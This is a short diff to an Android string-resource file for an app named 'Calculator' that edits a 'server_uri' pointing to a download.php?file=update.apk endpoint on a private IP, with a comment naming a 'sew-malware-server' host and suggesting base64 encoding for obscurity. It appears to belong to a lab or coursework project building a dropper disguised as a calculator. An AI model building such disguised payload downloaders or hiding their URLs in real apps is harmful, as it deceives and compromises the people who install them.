@@ -1,5 +1,5 @@
 <resources>
     <string name="app_name">Calculator</string>
-    <!-- <string name="server_uri">http://sew-malware-server.at:8000/download.php?file=update.apk</string> Could be base64 encoded for obscurity-->
-    <string name="server_uri">http://192.168.93.133:8000/download.php?file=update.apk</string>
+    <!-- <string name="server_name">http://sew-malware-server.at/download.php?file=update.apk</string> Could be base64 encoded for obscurity-->
+    <string name="server_uri">http://192.168.93.133/download.php?file=update.apk</string>
 </resources>
